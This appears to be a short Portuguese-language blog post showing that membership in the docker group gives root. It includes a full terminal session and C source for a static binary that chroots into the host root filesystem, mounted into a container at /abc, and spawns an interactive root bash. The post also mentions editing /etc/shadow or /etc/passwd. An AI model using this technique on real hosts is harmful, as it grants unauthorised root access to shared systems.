---
layout: post
title: Docker privilege escalation
---

# Docker privilege escalation

Uma dica rápida, estava procurando como rodar o docker
sem precisar usar o sudo e encontrei a resposta para o problema
na documentação oficial, bastava adicionar o usuário ao grupo docker e pronto,
e junto da solução também havia um aviso: adicionar o usuário ao grupo
docker dá ao mesmo privilegios de root.

E como eu poderia virar ruth ? A resposta é bem simples, quando
iniciamos um container o uid do processo é 0 (ou seja root), qualquer programa que você
execute terá permissão pra fazer qualquer coisa (talvez nem tudo, docker usa seccomp, é
so maneira de falar, mas vc entendeu ...), então podemos, por exemplo, mapear algum arquivo (/etc/shadow, /etc/passwd),
e usar um programa qualquer pra alterar o uid, ou adicionar um novo usuario, etc.

O que eu fiz foi bem simples, mapeei o dir / em /abc e usei um programa que executa ```chroot("/abc"); execve("/bin/bash", ...)```, take a l0.0k:

```
$ id
uid=171(luladrao) gid=171(luladrao) grupos=171(luladrao),974(docker)
$ docker build --tag luladrao .
Sending build context to Docker daemon  763.9kB
Step 1/3 : FROM scratch
 --->
Step 2/3 : ADD a.out /
 ---> 37b9f1f72752
Step 3/3 : CMD ["/a.out"]
 ---> Running in 72fa48821ba6
Removing intermediate container 72fa48821ba6
 ---> a9eca09cd332
Successfully built a9eca09cd332
Successfully tagged luladrao:latest
$ docker run --rm -it -v '/:/abc' luladrao
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
[root@a9138da798c2 .]# id
job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
uid=0(root) gid=0(root) groups=0(root)
```

As mensagens de erro provalvemente são porque usei chroot, mas usando cd da pra navegar tranquilamente pelos diretórios, código do programa que usei:


```c
/* gcc -static [file.c] */

#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>



void main(int a, char **b, char **envp){
    syscall(SYS_chroot, "/abc");
    syscall(SYS_execve, "/bin/bash", (char *[]){ "bash", "-i", NULL}, envp);
}

```
